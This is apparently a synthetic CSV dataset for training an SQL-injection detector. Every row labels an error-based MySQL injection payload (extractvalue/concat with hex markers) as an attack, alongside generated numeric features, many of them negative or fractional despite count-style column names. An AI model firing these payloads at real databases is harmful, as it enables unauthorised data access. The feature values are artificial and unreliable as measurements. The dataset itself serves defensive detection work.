id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,payload_length,alpha_count,digit_count,space_count,upper_count,lower_count,symbol_count,printable_ratio,alpha_ratio,digit_ratio,space_ratio,symbol_ratio,entropy,single_quote_count,double_quote_count,dash_count,hash_count,slash_count,backslash_count,left_paren_count,right_paren_count,comma_count,semicolon_count,equals_count,greater_count,less_count,percent_count,plus_count,asterisk_count,at_count,url_encoded_count,hex_literal_count,unicode_escape_count,comment_marker_count,comparison_op_count,function_call_count,quoted_string_count,kw_select,kw_union,kw_where,kw_from,kw_sleep,kw_benchmark,kw_pg_sleep,kw_waitfor,kw_delay,kw_case,kw_when,kw_then,kw_else,kw_end,kw_exists,kw_order,kw_group,kw_having,kw_information_schema,kw_sysibm,kw_mysql,kw_sqlite,kw_substring,kw_substr,kw_ascii,kw_char,kw_cast,kw_convert,kw_concat,kw_update,kw_delete,kw_insert,kw_drop,kw_create,kw_table,kw_database,kw_user,kw_version,kw_and,kw_or,kw_not,kw_like,kw_by,sql_keyword_total,boolean_signal,union_signal,time_signal,error_signal,order_signal,exists_signal,stacked_signal
GAN_000011,attack,error,"1'  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R000183,4.135403915361905,162.41351318359375,46.42177200317383,31.9675350189209,62.60013198852539,-0.4742911159992218,48.62397003173828,22.236778259277344,0.831034779548645,0.266338586807251,0.20767842233181,0.3810080587863922,0.12327659130096436,3.7307848930358887,1.0201826095581055,0.9872473478317261,0.6925312876701355,0.14335928857326508,0.2024930715560913,0.08964018523693085,5.649518013000488,5.99287748336792,4.538727760314941,-0.02658279985189438,1.2207603454589844,0.27221810817718506,-0.09163792431354523,-0.06850805878639221,0.12511534988880157,0.18760044872760773,-0.029816828668117523,-0.26568081974983215,2.588163375854492,0.14332102239131927,0.48586365580558777,1.365619421005249,4.3578009605407715,0.7340953946113586,1.1474500894546509,-0.20353855192661285,0.34451502561569214,0.3155844807624817,-0.036530010402202606,0.21297794580459595,0.07204215973615646,-0.12568016350269318,0.039946287870407104,0.07696039229631424,0.1988968849182129,0.2406080961227417,-0.022679349407553673,0.06035744398832321,0.1512053906917572,0.03070928156375885,-0.1669820100069046,0.005021676421165466,0.1096782237291336,0.014392241835594177,-0.0035448744893074036,0.14556768536567688,-0.01834980398416519,0.0216878280043602,0.046283841133117676,0.025941919535398483,0.17184731364250183,-0.026166008785367012,0.7706793546676636,0.1390933394432068,0.18955673277378082,0.1505136936903,-0.16249918937683105,-0.12454386055469513,0.1786169409751892,0.13268423080444336,0.01644071936607361,0.0029334528371691704,1.1326898336410522,0.2669576406478882,-0.16530269384384155,0.016647687181830406,0.15402129292488098,4.4816694259643555,0.6227201223373413,0.19452181458473206,0.1643390655517578,0.8441553711891174,0.23057995736598969,0.13805779814720154,0.2167966067790985
GAN_000012,attack,error,"1""  )   where 6255  =  6255 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   --",nearest_attack_euclidean,R000275,4.4516030067887975,163.72329711914062,44.1207389831543,33.10972213745117,62.10575485229492,-0.667346179485321,49.174659729003906,23.15024757385254,1.1355795860290527,0.2478087991476059,0.20296287536621094,0.3889314830303192,0.12541285157203674,3.6975133419036865,0.9675121903419495,1.566843867301941,0.9426398277282715,0.1974712312221527,0.16789467632770538,0.02828381396830082,5.831619739532471,5.979864597320557,4.315327167510986,-0.013930678367614746,1.2806099653244019,0.37465980648994446,0.12417206913232803,-0.10778027772903442,0.1303683966398239,0.2383328527212143,-0.07148882746696472,-0.12158546596765518,2.4524247646331787,0.28744256496429443,0.4187621474266052,1.47564697265625,4.216757297515869,0.3169071078300476,1.1661947965621948,-0.19374671578407288,0.43197882175445557,0.40252554416656494,0.1295260190963745,0.1909525841474533,0.3521617352962494,-0.1603371948003769,-0.2841886878013611,0.1653430163860321,0.13227419555187225,0.2428804188966751,-0.08571597188711166,0.17127184569835663,-0.0958273708820343,0.2904934883117676,-0.1375761181116104,-0.06728533655405045,0.21260416507720947,0.15741972625255585,-0.019777163863182068,-0.13738572597503662,0.1736815869808197,0.25772905349731445,-0.2402552366256714,-0.08940109610557556,0.24991050362586975,-0.06910218298435211,0.8001763224601746,0.30059340596199036,0.19850903749465942,0.14852596819400787,-0.20066681504249573,-0.25624948740005493,-0.0275861918926239,0.2213636338710785,0.03058733604848385,0.02280958741903305,1.0812150239944458,0.08299435675144196,-0.22599738836288452,-0.045341722667217255,0.07183793932199478,4.552746295928955,0.6291038393974304,0.2328222692012787,-0.02006007917225361,0.820974588394165,0.09108986705541611,0.35675591230392456,0.049072153866291046
GAN_000013,attack,error,"1'  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R000183,3.908952869291674,162.87307739257812,45.70001220703125,32.43683624267578,61.421546936035156,0.3130689561367035,48.32756042480469,21.408903121948242,1.0933037996292114,0.2878309488296509,0.2042594701051712,0.3849560618400574,0.1231071725487709,3.7274763584136963,0.6660990715026855,0.8505741357803345,0.6610716581344604,0.1547410935163498,0.12744663655757904,0.033615656197071075,5.615893363952637,5.995818614959717,4.163246154785156,0.0811462253332138,1.3553425073623657,0.19241636991500854,-0.041832201182842255,0.1963115632534027,0.09084310382604599,0.10839385539293289,0.05564887821674347,-0.13997593522071838,2.478360414505005,-0.0336456373333931,0.4080750346183777,1.4603191614151,4.378275394439697,0.7842705249786377,1.1922051906585693,-0.021288711577653885,0.2601434588432312,0.31827041506767273,0.06919393688440323,0.2161296308040619,0.07578883320093155,-0.10137216746807098,-0.19083905220031738,0.15801560878753662,0.13702791929244995,0.15303248167037964,0.06187088042497635,0.06761273741722107,-0.1524629145860672,0.08608882874250412,-0.0026454548351466656,0.0457485057413578,0.06739069521427155,0.09117615222930908,-0.14185573160648346,0.08768157660961151,0.05577407032251358,-0.01116059347987175,-0.062152616679668427,0.06207231059670448,0.2609592080116272,-0.028834404423832893,0.8414848446846008,0.037233270704746246,0.045811839401721954,0.019033797085285187,0.1522987186908722,-0.10755836218595505,0.04923663288354874,-0.04190748929977417,0.015937233343720436,0.012551898136734962,0.8927299976348877,0.3216404318809509,0.0110674649477005,0.10387759655714035,0.056901272386312485,4.659783840179443,0.4470318853855133,0.1760813593864441,0.1686834990978241,0.8276795148849487,-0.07052773237228394,-0.12568014860153198,-0.07514092326164246
GAN_000014,attack,error,"1'  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R000183,4.041532974800715,161.65921020507812,45.455841064453125,33.050506591796875,62.130611419677734,0.13938400149345398,48.45370101928711,22.57172203063965,1.1344105005264282,0.26409196853637695,0.20292161405086517,0.384646475315094,0.12392743676900864,3.69927978515625,0.8784976601600647,1.1464940309524536,0.9012458920478821,0.18088634312152863,0.18076744675636292,-0.04108288884162903,5.609346389770508,6.013386249542236,4.229282855987549,0.09567365795373917,1.2593516111373901,0.24093124270439148,0.058046769350767136,0.03966325521469116,0.12353194504976273,0.19862514734268188,0.010247483849525452,-0.07646584510803223,2.4824841022491455,0.2134355902671814,0.46302902698516846,1.4640440940856934,4.305401802062988,0.4398382604122162,1.0848637819290161,-0.19794419407844543,0.37484654784202576,0.34062620997428894,0.08210747689008713,0.18047462403774261,0.148953378200531,-0.07177403569221497,-0.18936863541603088,0.08756497502326965,0.15324662625789642,0.1784081757068634,-0.09574060887098312,0.11120110005140305,-0.05193854868412018,0.20188289880752563,-0.08856317400932312,-0.011798635125160217,0.20157954096794128,0.15298625826835632,-0.07070422172546387,-0.06509392708539963,0.1100241020321846,0.1209312230348587,-0.0797458216547966,-0.006143692880868912,0.2256024032831192,-0.01210131123661995,0.8411371111869812,0.0948910042643547,0.10280074924230576,0.09293606877326965,-0.11818098276853561,-0.22088609635829926,-0.033118583261966705,0.2284834235906601,0.013139139860868454,0.01741042546927929,1.1226258277893066,0.16781747341156006,-0.10793327540159225,0.00689423643052578,-0.056580640375614166,4.670053482055664,0.5058923959732056,0.12483540177345276,0.07209537923336029,0.8161821961402893,0.05528518557548523,0.23153892159461975,-0.05774363875389099
GAN_000015,attack,error,"1'  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R000183,3.9711761498370186,161.2100067138672,45.188472747802734,32.89278030395508,62.10566329956055,0.11561401933431625,49.09282302856445,22.643817901611328,1.2080144882202148,0.2552849352359772,0.20877258479595184,0.3798031508922577,0.12494875490665436,3.7097551822662354,0.9536798000335693,0.8361369967460632,0.7392722964286804,0.15094579756259918,0.13629470765590668,0.19396816194057465,5.507164001464844,6.080530166625977,4.512619495391846,-0.06180959939956665,1.2460846900939941,0.16677138209342957,-0.2501296103000641,0.05120319128036499,0.0254056379199028,0.16862277686595917,-0.032509945333004,-0.004397101700305939,2.479330539703369,0.34440168738365173,0.5491355657577515,1.3696107864379883,4.298411846160889,0.35080230236053467,0.9598724246025085,-0.13181662559509277,0.3043670952320099,0.44501179456710815,-0.11737439036369324,0.1281246691942215,0.008786715567111969,0.13086338341236115,-0.23160386085510254,0.0906786322593689,0.15658840537071228,0.14749324321746826,-0.10061825066804886,0.10649872571229935,-0.09655077755451202,0.03133343160152435,-0.038821980357170105,-0.03366249054670334,-0.03809385746717453,0.10646422207355499,0.10821522027254105,-0.12673592567443848,-0.013498611748218536,0.3781312108039856,0.06077044829726219,0.0702117383480072,0.18041792511940002,-0.12745147943496704,0.8171349763870239,0.08730228990316391,0.28192415833473206,0.009913541376590729,-0.08604114502668381,-0.12478993833065033,0.08947327733039856,0.34616196155548096,0.011183170601725578,0.014770781621336937,1.1125562191009521,0.16739752888679504,-0.18044990301132202,-0.04817654937505722,0.03763836622238159,4.52108097076416,0.6057014465332031,0.344893217086792,0.01642623357474804,0.7624237537384033,0.0009024180471897125,0.41628900170326233,-0.08653569221496582
GAN_000016,attack,error,"1'  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R000183,3.9779565562337145,162.6319580078125,44.56002426147461,32.213138580322266,60.60629653930664,0.7656884789466858,49.918182373046875,21.900861740112305,0.983913779258728,0.27196595072746277,0.2019912153482437,0.3781483769416809,0.12294267863035202,3.714827299118042,0.5956763625144958,0.6962049603462219,0.6313521265983582,0.12642121315002441,0.09161783009767532,-0.05074457824230194,5.5513176918029785,6.013481140136719,3.772566795349121,0.13703718781471252,1.3564079999923706,0.24267804622650146,-0.06222682446241379,0.2347094565629959,0.07163690030574799,0.12056824564933777,-0.024853147566318512,-0.1463455855846405,2.4883499145507812,0.016937103122472763,0.4006636440753937,1.5139108896255493,4.379324913024902,0.7116170525550842,1.0428661108016968,-0.1258307695388794,0.32175490260124207,0.41317299008369446,0.15830859541893005,0.1663975864648819,0.24571242928504944,-0.033766284584999084,-0.11138834804296494,0.13003535568714142,0.1346355676651001,0.14527951180934906,0.026727067306637764,0.09483085572719574,-0.16230915486812592,0.1608036756515503,0.08824141323566437,-0.02911026030778885,-0.029359273612499237,0.10971075296401978,-0.12514710426330566,0.2199239730834961,0.07537847012281418,-0.020903710275888443,-0.08932677656412125,0.13360242545604706,0.2728462815284729,0.07152540981769562,0.8285067677497864,-0.027010470628738403,0.0522993765771389,-0.0678747296333313,0.07310684025287628,-0.18629302084445953,0.005235791206359863,-0.06269723176956177,0.0050814226269721985,0.017652135342359543,0.9295253157615662,0.24373234808444977,-0.11875256150960922,0.1045827716588974,0.12508180737495422,4.796666145324707,0.4616174101829529,0.29522550106048584,0.15998326241970062,0.7598037123680115,-0.17925101518630981,-0.1298680454492569,0.07358298450708389
GAN_000017,attack,error,"1'  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R000183,4.0636954033419395,163.65211486816406,46.24365234375,32.47685241699219,60.46998977661133,-0.6591762900352478,47.6639404296875,22.540790557861328,1.3307242393493652,0.27182283997535706,0.21224665641784668,0.38524454832077026,0.12360002100467682,3.70509672164917,0.8315274715423584,0.9925392866134644,0.8183436393737793,0.14538949728012085,0.14653892815113068,-0.02661469206213951,5.8311028480529785,5.922106742858887,4.315248012542725,-0.13139674067497253,1.2596616744995117,0.1468369960784912,0.05672644451260567,0.06273004412651062,0.037155911326408386,0.15295127034187317,-0.05745618790388107,-0.06983765214681625,2.507509708404541,0.09455260634422302,0.5271304249763489,1.5072886943817139,4.404513359069824,0.716949999332428,1.2196691036224365,-0.06792294979095459,0.3152511417865753,0.20967775583267212,0.004724740982055664,0.17286762595176697,0.006194569170475006,-0.0206892192363739,-0.14634421467781067,0.12053649872541428,0.1799657642841339,0.1473071277141571,-0.10015863925218582,0.03697647899389267,-0.13478076457977295,0.0732322409749031,-0.06976377964019775,-0.0831962302327156,0.14167769253253937,0.025869157165288925,-0.07813814282417297,0.19484403729438782,-0.016469724476337433,-0.03321509063243866,-0.11532401293516159,0.14183692634105682,0.27146610617637634,-0.0605262853205204,0.9209039807319641,-0.08019814640283585,0.06767822802066803,0.012209504842758179,0.17877821624279022,-0.14019377529621124,0.16578826308250427,0.10437322407960892,0.027601994574069977,0.006100126076489687,0.9911378026008606,0.3509924113750458,-0.1976914405822754,0.04342792183160782,0.010507456958293915,4.261943340301514,0.5440797209739685,0.2761884331703186,0.15110468864440918,0.8559116721153259,0.10768736898899078,-0.10786040127277374,-0.040520086884498596
GAN_000018,attack,error,"1'  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R000183,4.182159352471417,161.5825653076172,44.77547836303711,30.588214874267578,58.54103088378906,0.3442274034023285,50.146270751953125,23.000133514404297,0.9811110496520996,0.26009809970855713,0.2077174186706543,0.3784957528114319,0.12423127889633179,3.696892261505127,0.4725431203842163,0.7241267561912537,0.6083912253379822,0.11828456073999405,0.12028192728757858,0.03861365467309952,5.687766075134277,5.7784953117370605,3.649632692337036,0.07646102458238602,1.2318899631500244,0.2970985174179077,-0.011201256886124611,0.12700790166854858,0.028642527759075165,0.12079533189535141,-0.11845020949840546,-0.14921927452087402,2.4378268718719482,0.08414748311042786,0.42319992184638977,1.565646767616272,4.4011125564575195,0.6013169884681702,1.0648249387741089,-0.15162599086761475,0.3591850697994232,0.45675867795944214,0.11706463992595673,0.12222857773303986,0.3501337468624115,-0.12550963461399078,-0.11012840270996094,0.14841924607753754,0.11897411197423935,0.15501439571380615,-0.024522369727492332,0.05652458220720291,-0.3023722767829895,0.22942718863487244,0.0949261337518692,-0.20307737588882446,-0.016286909580230713,0.1273362785577774,-0.10077077150344849,0.45805811882019043,0.0733514353632927,0.028912968933582306,-0.2542908489704132,0.23572348058223724,0.37690022587776184,0.1006733700633049,0.8248881697654724,0.020286530256271362,0.09072186052799225,-0.2156968116760254,0.12460041791200638,-0.2691705524921417,0.06689070165157318,-0.05016137659549713,0.016045624390244484,0.017558405175805092,0.9519776701927185,0.1581762284040451,-0.19700777530670166,0.0758921429514885,0.11897733062505722,4.6021409034729,0.5813136696815491,0.3881305158138275,0.09503278881311417,0.8442529439926147,-0.01959967240691185,-0.15812820196151733,0.09550141543149948
GAN_000019,attack,error,"1'  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R000183,4.140562208163874,161.51243591308594,43.5795783996582,32.59601974487305,61.80380630493164,-0.7910469174385071,50.381893157958984,22.297712326049805,0.8585171699523926,0.2645701766014099,0.20485243201255798,0.3807049095630646,0.12568283081054688,3.7301976680755615,0.9001750349998474,0.8321576118469238,0.5782740712165833,0.1342305690050125,0.161666139960289,0.21861368417739868,5.619229316711426,6.033567428588867,4.40294885635376,-0.013257943093776703,1.2127732038497925,0.2380487322807312,-0.10889090597629547,-0.021623820066452026,0.1096251830458641,0.18868307769298553,-0.030362553894519806,-0.3582780361175537,2.50394868850708,0.1945713460445404,0.40170180797576904,1.411899447441101,4.390495777130127,0.6088268756866455,1.0572385787963867,-0.1631348729133606,0.3517116904258728,0.3908991813659668,0.00967206060886383,0.1659088283777237,0.293444961309433,-0.12844036519527435,-0.055563852190971375,0.15388630330562592,0.20273326337337494,0.23297765851020813,0.02079700119793415,0.035326115787029266,-0.0007671117782592773,-0.00764339417219162,-0.15191394090652466,-0.12351996451616287,0.03701990842819214,0.1479768007993698,-0.19368377327919006,0.29402539134025574,0.004336915910243988,0.1493375599384308,-0.11883241683244705,-0.027375953271985054,0.24391090869903564,0.1379154622554779,0.7109401226043701,0.26125115156173706,0.1722501516342163,0.030700117349624634,-0.19729498028755188,-0.1918283998966217,0.18086382746696472,0.023138314485549927,0.020031364634633064,0.00897638127207756,1.0391921997070312,0.14641359448432922,-0.18671759963035583,0.08470518887042999,0.05025513470172882,4.504651069641113,0.6677913069725037,0.3220326900482178,0.02883256785571575,0.8001073598861694,0.11058460175991058,0.1227114275097847,0.12582466006278992
GAN_000020,attack,error,"1'  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R000183,4.446406224670233,159.86282348632812,44.379364013671875,31.438339233398438,61.51254653930664,-0.3220711052417755,50.01569747924805,23.19548988342285,0.8564985394477844,0.2492062747478485,0.20824748277664185,0.3842829763889313,0.12390189617872238,3.734269618988037,0.8168888688087463,1.1775544881820679,0.7071205377578735,0.15962718427181244,0.22575882077217102,0.054830409586429596,5.699160575866699,6.160118103027344,4.344450950622559,-0.07026410102844238,1.2146886587142944,0.4252597391605377,-0.07171355932950974,-0.09622791409492493,0.13173602521419525,0.24900905787944794,-0.08196058869361877,-0.2524409592151642,2.4794728755950928,0.16684842109680176,0.5133168697357178,1.4352099895477295,4.35920524597168,0.4223968982696533,1.0760555267333984,-0.3390379548072815,0.4496513903141022,0.4029231667518616,-0.006583474576473236,0.16636443138122559,0.2037743628025055,-0.05384208261966705,-0.023880846798419952,0.11007769405841827,0.2530941963195801,0.2722851037979126,-0.10980995744466782,0.05216006189584732,0.14411334693431854,0.15827006101608276,-0.08856608718633652,-0.05524349957704544,0.012287076562643051,0.056632932275533676,0.005205616354942322,0.07597801089286804,0.17674964666366577,0.20918028056621552,-0.12096255272626877,0.0009528510272502899,0.17722578346729279,-0.08565742522478104,0.7361899614334106,0.28224101662635803,0.24909472465515137,0.08682801574468613,-0.2939954400062561,-0.19007961452007294,0.20978671312332153,0.20592597126960754,0.009601480327546597,0.0037994482554495335,1.2465261220932007,0.1363547295331955,-0.30098292231559753,-0.03125446289777756,0.08439332246780396,4.470590591430664,0.686857283115387,0.14405111968517303,0.07155050337314606,0.8213334083557129,0.23990388214588165,0.3804115355014801,0.20587024092674255
GAN_000021,attack,error,"1  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  5130  =  5130",nearest_attack_euclidean,R000239,4.406284344209369,158.7981719970703,43.51040267944336,32.020599365234375,61.39652633666992,-0.272916704416275,51.0352897644043,23.685754776000977,0.7584336996078491,0.24364826083183289,0.21311107277870178,0.38237664103507996,0.12333398312330246,3.720472574234009,0.8758206367492676,0.9848760366439819,0.6613349914550781,0.19229768216609955,0.17383545637130737,0.105217844247818,5.7364182472229,6.168245315551758,4.352989673614502,-0.03291495889425278,1.1930569410324097,0.4706580638885498,-0.15170423686504364,-0.09380492568016052,0.12048354744911194,0.2452487200498581,-0.15702815353870392,-0.3068441152572632,2.5989251136779785,0.14054416120052338,0.4769887626171112,1.5287460088729858,4.445009231567383,0.5013957619667053,1.0866447687149048,-0.35447269678115845,0.46586909890174866,0.4242648780345917,0.042264845222234726,0.16811595857143402,0.3817318379878998,-0.08962233364582062,0.10226061940193176,0.09002187103033066,0.23952366411685944,0.2863049805164337,-0.12204524129629135,0.010777332819998264,0.2420012354850769,0.09798119217157364,-0.10592807084321976,-0.10396883636713028,0.08098305761814117,0.07528366148471832,-0.055525992065668106,0.1551632285118103,0.18602490425109863,0.06884075701236725,-0.09719014912843704,0.06701812148094177,0.19836533069610596,-0.007370393723249435,0.7431697845458984,0.18137940764427185,0.2086319625377655,0.05797119066119194,-0.3852032423019409,-0.18565112352371216,0.18913134932518005,0.19058141112327576,0.010105683468282223,0.005541511345654726,1.3481523990631104,0.14189910888671875,-0.3225422501564026,0.012341542169451714,0.16564518213272095,4.7267632484436035,0.6917393207550049,0.25080204010009766,0.06627514958381653,0.7990593910217285,0.22615720331668854,0.31843623518943787,0.3251182436943054
GAN_000022,attack,error,"1'  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R000183,4.240797359611622,160.82742309570312,45.8033332824707,31.68114471435547,62.817752838134766,-0.17718854546546936,48.78245162963867,22.83983612060547,1.0858465433120728,0.25883087515830994,0.19710029661655426,0.38245895504951477,0.12495043873786926,3.712874174118042,1.0758874416351318,1.1564055681228638,0.7941761016845703,0.11322854459285736,0.1316472738981247,0.12970957159996033,5.834543704986572,5.949086666107178,4.674010753631592,0.0028609707951545715,1.2025249004364014,0.16374699771404266,0.08802465349435806,0.006460397504270077,0.021725956350564957,0.21052786707878113,-0.1776537001132965,-0.10243748873472214,2.471099376678467,0.2943919897079468,0.5026288032531738,1.3731708526611328,4.197403907775879,0.28053000569343567,1.114634394645691,-0.1520431488752365,0.4662688672542572,0.4782523810863495,0.12224045395851135,0.13225072622299194,0.26103854179382324,0.054111406207084656,-0.2585046589374542,0.11859205365180969,0.1463228017091751,0.21903781592845917,-0.1271301954984665,0.16385558247566223,0.03447940573096275,0.08350788801908493,-0.03175756335258484,-0.2855379283428192,0.1142040491104126,-0.08992594480514526,0.10817713290452957,0.10563592612743378,0.020579218864440918,0.2864260673522949,-0.11998205631971359,-0.07024753838777542,0.20860593020915985,0.09872705489397049,0.7892647981643677,0.16586145758628845,0.22579017281532288,-0.05944366753101349,-0.2073637843132019,-0.29742223024368286,0.0386214479804039,0.13425835967063904,0.012968028895556927,0.015045667067170143,1.0543837547302246,0.09733520448207855,-0.2971770763397217,-0.04041586071252823,-0.0292794331908226,4.489078044891357,0.6378253102302551,0.1744081676006317,-0.023638637736439705,0.8067048788070679,-0.04592125862836838,0.38339921832084656,0.06184431165456772
GAN_000023,attack,error,"1'  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R000183,4.1935077988307246,162.52850341796875,46.37201690673828,32.53548812866211,62.67172622680664,-1.4289581775665283,48.20618438720703,22.568723678588867,0.9517478942871094,0.274356484413147,0.20366498827934265,0.3816846013069153,0.12503381073474884,3.7098329067230225,1.1109619140625,1.038030743598938,0.8216180801391602,0.11702677607536316,0.19888824224472046,0.1697503626346588,5.770936489105225,6.0335822105407715,4.883264541625977,-0.08796520531177521,1.215709924697876,0.14423684775829315,-0.043322399258613586,-0.006151796318590641,0.07021640986204147,0.1824822723865509,-0.14617162942886353,-0.2687305510044098,2.522151470184326,0.19386297464370728,0.5273293852806091,1.4832879304885864,4.3641252517700195,0.7421324849128723,1.1997668743133545,-0.19750268757343292,0.35511988401412964,0.2674766778945923,-0.091158926486969,0.19526392221450806,0.11590871959924698,-0.012496352195739746,-0.05710858851671219,0.12713584303855896,0.19754092395305634,0.20256128907203674,-0.06579255312681198,0.09693535417318344,-0.06808826327323914,-0.01961805298924446,-0.1980592906475067,-0.11151792854070663,0.1650950312614441,0.030187856405973434,-0.08548098802566528,0.3192276656627655,0.04655907303094864,0.14082305133342743,-0.10653624683618546,0.09108030796051025,0.204532191157341,0.02732621133327484,0.8224994540214539,0.08805156499147415,0.0993727296590805,0.13837109506130219,-0.03236469626426697,-0.20039570331573486,0.19293440878391266,0.013070814311504364,0.021749362349510193,0.0021014802623540163,1.0845835208892822,0.25473567843437195,-0.15883073210716248,0.01873147301375866,-0.1085110530257225,4.24579381942749,0.6344406008720398,0.2559589445590973,0.09493457525968552,0.8650357723236084,0.0749315693974495,0.14602547883987427,0.07261503487825394
